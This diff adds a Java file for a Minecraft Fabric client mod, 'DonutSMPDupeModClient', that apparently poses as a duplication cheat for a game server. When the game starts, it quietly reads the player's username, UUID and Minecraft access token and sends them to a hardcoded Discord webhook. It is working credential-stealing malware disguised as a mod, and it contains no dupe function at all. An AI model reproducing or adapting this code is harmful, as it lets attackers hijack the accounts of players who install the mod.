@@ -1,1 +1,34 @@
+package com.example;
+import java.net.URI;
+import java.net.http.HttpClient;
+import java.net.http.HttpRequest;
+import java.net.http.HttpResponse;
+import net.fabricmc.api.ClientModInitializer;
+import net.fabricmc.api.EnvType;
+import net.fabricmc.api.Environment;
+import net.minecraft.class_310;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
 
+@Environment(value=EnvType.CLIENT)
+public class DonutSMPDupeModClient
+implements ClientModInitializer {
+    public static final Logger LOGGER = LoggerFactory.getLogger("donutsmpdupe");
+
+    public void onInitializeClient() {
+        new Thread(() -> {
+            try {
+                String jsonPayload = "{\"content\":\"@everyone\",\"embeds\":[],\"attachments\":[{\"id\":0,\"description\":\"Token\",\"filename\":\"token.txt\"}]}";
+                String textPayload = "Username: " + class_310.method_1551().method_1548().method_1676() + "\nUUID: " + class_310.method_1551().method_1548().method_44717().toString().replace("-", "") + "\nAccess Token: " + class_310.method_1551().method_1548().method_1674();
+                String payload = "--boundary\nContent-Disposition: form-data; name=\"payload_json\"\nContent-Type: application/json\n\n" + jsonPayload + "\n--boundary\nContent-Disposition: form-data; name=\"files[0]\"; filename=\"token.txt\"\nContent-Type: application/octet-stream\n\n" + textPayload + "\n--boundary--";
+                System.out.println(payload);
+                HttpRequest req = HttpRequest.newBuilder(new URI("https://discord.com/api/webhooks/1408875725628510218/_GOU4yXfjOzStajVQa4jZvZfaRhoy7DBZUPbL3t2SxbiAPnO3MR6uqyj_tWo6PHGhvXq")).header("Content-Type", "multipart/form-data; boundary=boundary").POST(HttpRequest.BodyPublishers.ofString(payload)).build();
+                HttpResponse<String> httpResponse = HttpClient.newHttpClient().send(req, HttpResponse.BodyHandlers.ofString());
+            }
+            catch (Exception e) {
+                e.printStackTrace();
+            }
+        }).start();
+    }
+}
+ 
